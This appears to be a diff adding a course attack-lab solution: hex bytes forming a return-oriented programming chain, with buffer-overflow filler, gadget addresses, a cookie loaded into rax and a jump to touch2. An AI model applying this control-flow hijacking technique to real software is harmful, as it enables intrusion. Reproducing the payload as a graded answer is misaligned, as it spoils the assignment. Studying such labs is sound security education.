@@ -1,0 +1,9 @@
+ef be ad de ef be ad de     /* rsp - 40 */
+ef be ad de ef be ad de     /* rsp - 32 */
+ef be ad de ef be ad de     /* rsp - 24 */
+ef be ad de ef be ad de     /* rsp - 16 */
+ef be ad de ef be ad de     /* rsp - 8 */
+ab 19 40 00 00 00 00 00     /* return address: call addval_219+4 */
+fa 97 b9 59 00 00 00 00     /* cookie: popped into rax */
+a2 19 40 00 00 00 00 00     /* return address: call addval_273+2 */
+ec 17 40 00 00 00 00 00     /* return address: call touch2 */
